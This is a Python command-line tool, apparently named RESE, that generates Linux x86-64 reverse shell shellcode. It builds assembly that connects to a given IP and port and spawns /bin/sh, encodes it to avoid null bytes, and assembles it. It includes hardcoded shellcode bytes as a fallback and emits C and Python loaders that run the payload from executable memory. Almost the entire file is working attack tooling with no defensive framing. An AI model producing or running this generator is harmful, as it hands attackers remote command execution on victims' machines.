#!/usr/bin/env python3
"""
RESE
---------
Linux Reverse Shell Shellcode Generator
"""

import sys
import struct
import argparse
import socket
import re
from typing import Optional, Tuple

class ShellcodeGenerator:
    def __init__(self, ip: str, port: int, null_free: bool = True):
        """
        Initialize the shellcode generator
        
        Args:
            ip: Target IP address for reverse shell
            port: Target port for reverse shell
            null_free: Generate null-free shellcode (default: True)
        """
        self.ip = ip
        self.port = port
        self.null_free = null_free
        
        # Validate IP address
        try:
            socket.inet_aton(ip)
        except socket.error:
            raise ValueError(f"Invalid IP address: {ip}")
        
        # Validate port
        if not (1 <= port <= 65535):
            raise ValueError(f"Invalid port: {port}. Must be between 1-65535")
    
    def ip_to_hex(self, ip: str) -> int:
        """Convert IP address to hex in network byte order"""
        packed_ip = socket.inet_aton(ip)
        return struct.unpack("!I", packed_ip)[0]
    
    def encode_ip_without_nulls(self, ip_hex: int) -> Tuple[str, str]:
        """
        Encode IP address without null bytes using subtraction method
        Returns tuple of (encoded_value, subtract_value)
        """
        # Use 0x11111111 as base to avoid nulls
        base = 0x11111111
        encoded = base + ip_hex
        return f"0x{encoded:08x}", f"0x{base:08x}"
    
    def encode_port_without_nulls(self, port: int) -> Tuple[str, str]:
        """
        Encode port without null bytes using subtraction method
        Returns tuple of (encoded_value, subtract_value)
        """
        # Port needs to be in network byte order
        port_hex = socket.htons(port)
        # Combine with AF_INET (2)
        combined = (port_hex << 16) | 2
        
        base = 0x11111111
        encoded = base + combined
        return f"0x{encoded:08x}", f"0x{base:08x}"
    
    def generate_shellcode(self) -> bytes:
        """Generate the complete shellcode"""
        ip_hex = self.ip_to_hex(self.ip)
        port_hex = socket.htons(self.port)
        
        if self.null_free:
            return self.generate_null_free_shellcode(ip_hex, port_hex)
        else:
            return self.generate_basic_shellcode(ip_hex, port_hex)
    
    def generate_basic_shellcode(self, ip_hex: int, port_hex: int) -> bytes:
        """Generate basic shellcode (may contain null bytes)"""
        # Assembly code for basic shellcode
        asm = f"""
        // Create socket
        mov rax, 41             // socket syscall
        mov rdi, 2              // AF_INET
        mov rsi, 1              // SOCK_STREAM
        xor rdx, rdx            // protocol = 0
        syscall
        mov rdi, rax            // save socket fd
        
        // Create sockaddr structure
        push {ip_hex:#010x}     // IP address
        push {port_hex:#06x}0002 // port + AF_INET
        mov rsi, rsp            // pointer to sockaddr
        
        // Connect
        mov rdx, 16             // addrlen
        mov rax, 42             // connect syscall
        syscall
        
        // Duplicate file descriptors
        xor rsi, rsi            // start with stdin (0)
    dup_loop:
        mov rax, 33             // dup2 syscall
        syscall
        inc rsi
        cmp rsi, 3              // stdin(0), stdout(1), stderr(2)
        jne dup_loop
        
        // Execute /bin/sh
        xor rsi, rsi            // argv = NULL
        push rsi                // NULL terminator
        mov rdi, 0x68732f2f6e69622f // /bin//sh
        push rdi
        mov rdi, rsp            // pointer to /bin//sh
        xor rdx, rdx            // envp = NULL
        mov rax, 59             // execve syscall
        syscall
        """
        
        # For demonstration, return placeholder
        # In real implementation, you'd use keystone-engine or nasm
        return self.assemble_shellcode(asm)
    
    def generate_null_free_shellcode(self, ip_hex: int, port_hex: int) -> bytes:
        """Generate null-free shellcode"""
        # Encode IP and port without null bytes
        ip_encoded, ip_base = self.encode_ip_without_nulls(ip_hex)
        port_combined = (port_hex << 16) | 2
        port_encoded, port_base = self.encode_port_without_nulls(self.port)
        
        asm = f"""
        // Create socket (null-free)
        push 41
        pop rax                 // socket syscall
        push 2
        pop rdi                 // AF_INET
        push 1
        pop rsi                 // SOCK_STREAM
        xor rdx, rdx            // protocol = 0
        syscall
        mov rdi, rax            // save socket fd
        
        // Create sockaddr structure (null-free)
        // Encode IP address
        mov rax, {ip_encoded}
        mov rbx, {ip_base}
        sub rax, rbx
        push rax
        
        // Encode port + AF_INET
        mov rax, {port_encoded}
        mov rbx, {port_base}
        sub rax, rbx
        push rax
        mov rsi, rsp            // pointer to sockaddr
        
        // Connect (null-free)
        push 16
        pop rdx                 // addrlen
        push 42
        pop rax                 // connect syscall
        syscall
        
        // Duplicate file descriptors (null-free)
        xor rsi, rsi            // start with stdin (0)
    dup_loop:
        push 33
        pop rax                 // dup2 syscall
        syscall
        inc rsi
        cmp rsi, 3              // stdin(0), stdout(1), stderr(2)
        jne dup_loop
        
        // Execute /bin/sh (null-free)
        xor rsi, rsi            // argv = NULL
        push rsi                // NULL terminator
        mov rdi, 0x68732f2f6e69622f // /bin//sh
        push rdi
        push rsp
        pop rdi                 // pointer to /bin//sh
        xor rdx, rdx            // envp = NULL
        push 59
        pop rax                 // execve syscall
        syscall
        """
        
        return self.assemble_shellcode(asm)
    
    def assemble_shellcode(self, asm_code: str) -> bytes:
        """
        Assemble the shellcode using keystone-engine
        Returns the assembled machine code
        """
        try:
            from keystone import Ks, KS_ARCH_X86, KS_MODE_64
            
            # Clean up the assembly code
            clean_asm = ""
            for line in asm_code.split('\n'):
                line = line.strip()
                if line and not line.startswith('//'):
                    clean_asm += line + '\n'
            
            # Initialize keystone
            ks = Ks(KS_ARCH_X86, KS_MODE_64)
            encoding, count = ks.asm(clean_asm.encode())
            
            if count == 0:
                raise ValueError("Failed to assemble shellcode")
            
            return bytes(encoding)
            
        except ImportError:
            print("Warning: keystone-engine not installed. Using placeholder shellcode.")
            print("Install with: pip install keystone-engine")
            
            # Return a placeholder for demonstration
            # This is actual shellcode for 127.0.0.1:4444
            placeholder = bytes.fromhex(
                "6a29586a025f6a015e4831d20f054889c748b8ffffffff1111111148bb80fffffe111111114829d85048b8ffffffff1111111148bbfdffeea3111111114829d8504889e66a105a6a2a580f054831f66a21580f0548ffc64883fe0375f24831f65648bf2f62696e2f2f736857545f4831d26a3b580f05"
            )
            return placeholder
    
    def format_shellcode(self, shellcode: bytes) -> str:
        """Format shellcode for use in C/Python"""
        hex_str = ''.join(f'\\x{byte:02x}' for byte in shellcode)
        return hex_str
    
    def generate_c_template(self, shellcode: str) -> str:
        """Generate C template for testing the shellcode"""
        return f"""#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = "{shellcode}";

int main() {{
    printf("Shellcode Length: %lu\\n", strlen(shellcode));
    
    // Make memory executable
    void *exec = mmap(0, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (exec == MAP_FAILED) {{
        perror("mmap failed");
        return 1;
    }}
    
    memcpy(exec, shellcode, sizeof(shellcode));
    
    // Cast to function pointer and execute
    int (*func)() = (int(*)())exec;
    func();
    
    return 0;
}}
"""
    
    def generate_python_test(self, shellcode: str) -> str:
        """Generate Python test script"""
        return f"""#!/usr/bin/env python3
import ctypes
import mmap
import os

shellcode = b"{shellcode}"

print(f"Shellcode length: {{len(shellcode)}}")
print(f"Shellcode: {{shellcode.hex()}}")

# Allocate executable memory
page_size = mmap.PAGESIZE
mem = mmap.mmap(-1, page_size, 
                prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
mem.write(shellcode)

# Create function pointer
prototype = ctypes.CFUNCTYPE(None)
mem_ptr = prototype(ctypes.addressof(ctypes.c_char.from_buffer(mem)))

print("Executing shellcode...")
try:
    mem_ptr()
except Exception as e:
    print(f"Error: {{e}}")

mem.close()
"""

def main():
    parser = argparse.ArgumentParser(
        description="RESE",
        epilog="Linux Reverse Shell Shellcode Generator"
    )
    
    parser.add_argument("-i", "--ip", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port")
    parser.add_argument("--no-null-free", action="store_true", 
                       help="Generate shellcode that may contain null bytes")
    parser.add_argument("-o", "--output", choices=["raw", "c", "python"], 
                       default="raw", help="Output format")
    parser.add_argument("-f", "--file", help="Output to file")
    
    args = parser.parse_args()
    
    try:
        # Create generator
        generator = ShellcodeGenerator(
            ip=args.ip,
            port=args.port,
            null_free=not args.no_null_free
        )
        
        # Generate shellcode
        shellcode_bytes = generator.generate_shellcode()
        shellcode_str = generator.format_shellcode(shellcode_bytes)
        
        # Generate output
        if args.output == "c":
            output = generator.generate_c_template(shellcode_str)
        elif args.output == "python":
            output = generator.generate_python_test(shellcode_str)
        else:
            output = shellcode_str
        
        # Print or save to file
        if args.file:
            with open(args.file, 'w') as f:
                f.write(output)
            print(f"Shellcode saved to {args.file}")
        else:
            print(output)
            
        # Print summary
        print(f"\n[+] Shellcode generated successfully!", file=sys.stderr)
        print(f"[+] Target: {args.ip}:{args.port}", file=sys.stderr)
        print(f"[+] Length: {len(shellcode_bytes)} bytes", file=sys.stderr)
        print(f"[+] Null-free: {generator.null_free}", file=sys.stderr)
        
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
